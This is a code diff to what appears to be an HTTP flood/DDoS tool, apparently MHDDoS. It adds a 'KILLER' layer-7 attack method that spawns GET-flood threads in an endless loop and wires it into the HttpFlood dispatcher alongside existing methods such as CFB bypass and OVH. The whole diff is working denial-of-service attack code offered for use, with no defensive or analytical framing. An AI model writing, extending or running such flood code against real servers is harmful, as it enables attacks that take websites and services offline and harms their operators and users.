@@ -78,7 +78,7 @@ class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
-        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER"
+        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER"
     }
 
     LAYER4_METHODS: Set[str] = {
@@ -689,6 +689,10 @@ class HttpFlood(Thread):
                 Tools.send(s, self._defaultpayload)
         Tools.safe_close(s)
 
+    def KILLER(self) -> None:
+        while True:
+            Thread(target=self.GET, daemon=True).start()
+
     def GET(self) -> None:
         payload: bytes = self.generate_payload()
         s = None
@@ -968,6 +972,7 @@ class HttpFlood(Thread):
         if name == "EVEN": self.SENT_FLOOD = self.EVEN
         if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
         if name == "BOMB": self.SENT_FLOOD = self.BOMB
+        if name == "KILLER": self.SENT_FLOOD = self.KILLER
 
 
 class ProxyManager:
